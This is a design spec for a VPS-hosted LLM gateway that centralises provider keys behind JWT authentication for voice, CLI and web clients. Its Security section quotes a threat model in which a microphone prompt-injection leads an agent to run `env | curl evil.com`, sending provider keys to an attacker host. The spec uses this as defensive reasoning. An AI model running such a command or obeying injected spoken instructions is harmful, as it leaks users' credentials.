# JARVIS Hub — design (Sub-project 1: Hub Gateway)

**Date:** 2026-06-29
**Status:** Design — pending user review → plan
**Program:** JARVIS Hub (4 sub-projects). **This spec covers sub-project 1 only.**

## Context

JARVIS has three clients — voice-agent, CLI (`bin/jarvis`), web (`src/web`) —
that today each hold their **own** provider keys (`~/.jarvis/keys.env` on every
box) and choose their own model. The user wants the **claude.ai + Claude Code
model**: one central backend that multiple thin clients log into, where the
*account* is the shared layer and the *provider lives server-side*. Anthropic
has two such clients (claude.ai web, Claude Code CLI) on one account hitting one
API (`api.anthropic.com`); JARVIS has three, and the "central API" should be the
user's **VPS** (`0wlan.com`, Hetzner, already running the web stack).

**Grounded current state** (what already exists vs the gap):

| claude.ai / Claude Code | JARVIS today | Status |
|---|---|---|
| Anthropic account (OAuth token) | `jarvis auth login` → JWT in `.credentials.json` (`src/cli/src/utils/auth.ts:1327`) | ✅ built |
| Central API: token-gate + route | `:4000` proxy verifies login JWT (`src/cli/src/proxy/server.ts:153-198`) + `getProviderForModel` routing + SSE streaming + per-provider key signing | ✅ built, but **local** (per-box) |
| claude.ai web client | `src/web` on the VPS | ✅ built |
| Claude Code CLI client | `bin/jarvis` → proxy | ✅ built |
| *(Anthropic has no voice)* | voice-agent | ⚠️ **purely local config; logs into nothing** |
| Server holds the keys | keys **already on the VPS** (`.env.production`) but **also** duplicated in `keys.env` on every box — clients read the *local* copy | ❌ the gap: clients read local keys |

So "the provider comes from the server" is not a rebuild — it is **promoting the
existing local `:4000` proxy onto the VPS** and pointing all three clients at it.

## Goal (program)

All three clients route their LLM traffic through a **VPS-hosted Hub Gateway**;
provider keys live **only on the VPS**. The user picks a model/mode once (the
account state on the VPS) and all clients use it.

**Decision — "Full hub" (user, 2026-06-29):** every client, *including voice*,
routes LLM through the VPS gateway. Chosen over the hybrid (voice dials providers
directly) for the purest claude.ai parity and the tightest key security.

**The disanalogy this program must respect:** Anthropic *hosts* the models, so
routing-through-the-server costs them no extra latency. The VPS *proxies* to
third-party providers, so each voice turn gains one VPS round-trip on first
token. Two consequences are load-bearing across the program:

1. **Latency is measured on the CLI (sub-project 2) before voice (sub-project 3)
   is cut over.** If the added round-trip is unacceptable for real-time voice,
   the hybrid fallback (voice dials direct with VPS-managed keys) is the escape
   hatch — but we prove the cost first.
2. **Graceful degradation is non-negotiable** (this project's single most
   recurring failure is *silent* voice death — mic-drain, suspend/network, CUDA).
   When the hub is unreachable, JARVIS must **say** "I can't reach the hub right
   now," never go mute. A local-direct fallback flag (default **off**, honoring
   "full hub") will exist so voice can optionally survive a network blip. (Both
   land in sub-project 3, noted here so the program contract is explicit.)

## Program decomposition

Four sub-projects, each its own spec → plan → build, in dependency order:

| # | Sub-project | What | Size |
|---|---|---|---|
| **1** | **Hub Gateway on the VPS** (this spec) | Deploy the Bun proxy as a container in the `src/web` stack behind Caddy at `/hub`; add **OpenAI-shaped ingress**; keep JWT auth + routing + streaming; add `GET /hub/config`. Keys live here. | L — foundation |
| 2 | CLI → hub (+ install onboarding) | Point CLI `ANTHROPIC_BASE_URL` at the VPS; `jarvis auth login` → VPS. A fresh `install.sh` box logs into the hub and **never needs local keys**. Measure latency. | S |
| 3 | Voice → hub | Repoint `providers/llm.py` builders at the hub + JWT; fetch active mode at session start; circuit-breaker + optional local-direct fallback. | L |
| 4 | Web → hub + modes on the VPS | Web calls the hub locally; promote `modes.json` to a VPS store so mode picks sync to all clients. | M |
| 5 | GitHub agents → hub | The dormant `claude-code-action` workflows (`jarvis -p` as @claude / PR-review / security-review) route through the hub using a **minted CI token** (a GitHub secret), not a raw `ANTHROPIC_API_KEY` — raw provider keys never touch GitHub. Needs a CI-token mint + revoke path on the web. | M |

Sub-projects 2–5 each get their own spec when sub-project 1 lands.

**Clients beyond the three (the claude.ai parity payoff).** Because the hub is
JWT-gated and internet-facing, *any* client that can present a token is a hub
client — exactly how Claude Code works from a laptop, a fresh install, or CI:

- **Fresh installs** (`curl 0wlan.com/install.sh | bash` → binary → `jarvis auth
  login`): a brand-new box gets provider access from the hub and **never holds a
  provider key**. (Folded into sub-project 2 — same base-URL + login wiring.)
- **GitHub Actions** (sub-project 5): the agent runs `jarvis -p` against the hub
  with a CI token in `${{ secrets.JARVIS_HUB_TOKEN }}`. This replaces "paste your
  `ANTHROPIC_API_KEY` into GitHub secrets" (the current dormant-workflow plan)
  with a **revocable, hub-scoped** token — the raw keys stay on the VPS.

Neither changes sub-project 1's gateway code — they consume it. They do raise one
gateway requirement, captured below: **token lifecycle + rate-limiting**, because
the gateway is now an internet-facing endpoint that fronts every provider key.

---

## Sub-project 1 — Hub Gateway

### The crux (grounded finding)

The proxy ingests **Anthropic `/v1/messages` only** (`server.ts:221-227`
handles `/health` and `POST …/messages`), then **translates to OpenAI
`/chat/completions` upstream** (`server.ts:69`, `:409`). It is an
Anthropic-shape→any-provider translator. Therefore:

- **CLI works through it unchanged** (Claude-Code-shaped = `/v1/messages`).
  Sub-project 2 is genuinely a base-URL swap.
- **Voice's DeepSeek/Kimi and the web are OpenAI-shaped clients**
  (`POST /v1/chat/completions`) and have **no ingress** on the proxy today.

**Sub-project 1 is: add an OpenAI-shaped ingress (`POST /v1/chat/completions`)
additively**, sharing the existing JWT gate, `getProviderForModel` routing, and
SSE streaming. Because the proxy's *upstream* call is already
OpenAI-shaped (`${provider.baseUrl}/chat/completions`), the OpenAI ingress is a
**passthrough** (parse OpenAI body → route → re-key → stream the OpenAI-shaped
response straight back) — *thinner* than the `/v1/messages` path, which has to
translate Anthropic⇆OpenAI both directions. OpenAI-ingress→Anthropic-upstream is
**out of scope** (no client does it — Claude models always arrive via the
Anthropic-shaped `/v1/messages` path).

### Components

1. **OpenAI ingress handler** — `src/cli/src/proxy/server.ts` (additive branch
   next to `:227`):
   ```
   if (req.method === 'POST' &&
       (url.pathname.endsWith('/chat/completions') ||
        url.pathname === '/v1/chat/completions')) { … }
   ```
   Verify JWT (reuse existing gate) → parse `{model, messages, stream, …}` →
   `getProviderForModel(model)` → forward to `${provider.baseUrl}/chat/completions`
   with the provider key → stream the response back unchanged. Reuse the existing
   `fetchWithRetry` + streaming machinery; do **not** duplicate the Anthropic
   translation layer.

2. **Hub container** — new `hub` service in `src/web/docker-compose.yml`
   (alongside `caddy`/`web`/`docker-proxy`/`postgres`). Runs the Bun proxy
   (`bun run src/proxy/server.ts`) with `JARVIS_PROXY_HOST=0.0.0.0` (the env
   already exists, `server.ts:141`) so Caddy can reach it on the compose network.
   **Never publishes a host port** — only Caddy talks to it. Build context points
   at `src/cli` (cross-tree coupling — see Risks).

3. **Edge route** — `src/web/Caddyfile`: a `handle_path /hub/*` block that
   strips the `/hub` prefix and `reverse_proxy hub:4000`, so a client request to
   `https://0wlan.com/hub/v1/chat/completions` reaches the proxy as
   `/v1/chat/completions`.

4. **Keys — already on the VPS; no key work in sub-project 1.** Verified
   2026-06-29: `ANTHROPIC`/`DEEPSEEK`/`GOOGLE`/`KIMI`/`OPENAI` `_API_KEY` **and**
   `JARVIS_PROXY_JWT_SECRET` are already in `src/web/.env.production`. The hub
   container inherits them via `process.env` — it boots authenticated and keyed
   with no setup. (Trivial cleanup the plan can fold in: drop the stale
   `GROQ_API_KEY` left in `.env.production` after the Groq eradication.) The
   **only** key action in the entire program is **removing the local
   `keys.env` provider copies at final cutover** — which must come *after*
   sub-projects 2–4 repoint the clients, because today voice + CLI read those
   local keys directly; removing them sooner breaks both immediately.

5. **`GET /hub/config`** — minimal here: returns the model catalog + which
   providers have keys configured on the VPS (so clients can discover what's
   available). Active-mode serving defers to sub-project 4 (avoid building a
   throwaway store now).

### Data flow

```
client → https://0wlan.com/hub/v1/{messages|chat/completions}   (Bearer JWT)
       → Cloudflare (Access EXCLUDES /hub) → Caddy (strip /hub)
       → hub:4000 → verify JWT offline (JARVIS_PROXY_JWT_SECRET)
       → getProviderForModel(model) → upstream provider (key from VPS env)
       → SSE stream back to the client
```

### Error handling

- **Missing/invalid JWT** → 401 (reuse existing gate; `server.ts:198` already
  handles the "auth required but secret unset" case).
- **Unknown model** → 400 with the model id (don't silently pick a default).
- **Upstream provider error** → pass the provider's status + body through; do
  not swallow.
- **Streaming client disconnect** → abort the upstream socket (the existing
  proxy already handles stream lifecycle; verify it holds for the OpenAI path).

### Security

- Keys live only on the VPS → the CLAUDE.md threat ("a mic prompt-injection runs
  `env | curl evil.com` and exfiltrates every provider key") is **defanged**: the
  local box holds only a revocable, rate-limited, hub-scoped JWT, not raw keys.
- The VPS becomes the crown-jewel target. It is already behind Cloudflare; the
  hub container binds `0.0.0.0` **only on the internal compose network** (no
  published port). **Cloudflare Access must exclude `/hub`** (clients authenticate
  with the JWT, not the Access cookie) — same exclusion pattern as `/install.sh`
  + `/releases`. This is a Cloudflare-dashboard deploy step, not code.
- **Key rotation:** once the local copies are removed (final cutover), keys sit
  only on the VPS — rotation becomes a single VPS env edit + `docker compose up
  -d hub`. Document in the runbook.
- **Token lifecycle (gateway is internet-facing + fronts every key).** Offline
  HS256 JWT verification can't revoke a leaked token on its own. Sub-project 1's
  clients are all interactive, so #1 just enforces **token expiry** (the gate
  already verifies the signature; add an `exp` check) → short-lived JWTs +
  refresh, exactly like Claude Code's auto-refreshing `jarvis auth login`.
  Revocation of long-lived **CI tokens** (a denylist the gateway consults) is
  introduced in **sub-project 5**, alongside the only thing that mints them — no
  revocation machinery before there's a revocable token (YAGNI).
- **Rate-limiting via Cloudflare, not code (ponytail):** per-token / per-IP rate
  limits on the `/hub` route are configured at the Cloudflare edge already in
  front of the VPS — no proxy code. This caps the blast radius if a token leaks
  (an attacker burns a rate-limited, revocable token, never the raw keys).

### Testing

- **Bun unit tests** (the proxy already has `maxOutputTokens.test.ts` + ~135
  smoke): add OpenAI-ingress tests — an OpenAI-shaped request for each provider
  family routes to the right upstream and streams an OpenAI-shaped response;
  auth-gate rejects a missing/expired JWT on the new path; `/hub/config` returns
  the catalog + configured providers.
- **Live smoke** (a script, not CI): `curl` through Caddy in **both** shapes —
  Anthropic `/hub/v1/messages` and OpenAI `/hub/v1/chat/completions` — with a
  real login JWT, confirming streamed tokens come back.
- **Latency probe**: time first-token through the hub vs direct, recorded for the
  sub-project 2/3 go/no-go on voice.

### Out of scope (this sub-project)

- Pointing the CLI / voice / web at the hub (sub-projects 2/3/4).
- Install-onboarding wiring + a fresh box logging into the hub (sub-project 2).
- GitHub CI-token mint/revoke + workflow re-wiring (sub-project 5).
- Emptying local `keys.env` of provider keys (post-cutover step).
- The VPS-side conversation-mode store + active-mode serving (sub-project 4).
- The voice circuit-breaker + local-direct fallback (sub-project 3).

### Risks / decisions

- **Cross-tree coupling:** `src/web/docker-compose.yml` now builds from
  `src/cli`. This is the first web↔cli build dependency. Acceptable (the proxy is
  the shared backend by definition), but the spec flags it per
  `.claude/rules/regression-prevention.md` — the compose build context and any
  CI that builds the web stack must include `src/cli`.
- **`0.0.0.0` bind:** load-bearing that it stays behind Caddy/Cloudflare. The
  plan must assert "no `ports:` mapping on the `hub` service."
- **Resolved decisions:** full hub (incl. voice) — yes; reuse `proxy/server.ts`
  rather than reimplement in Next.js — yes; start with the gateway — yes.
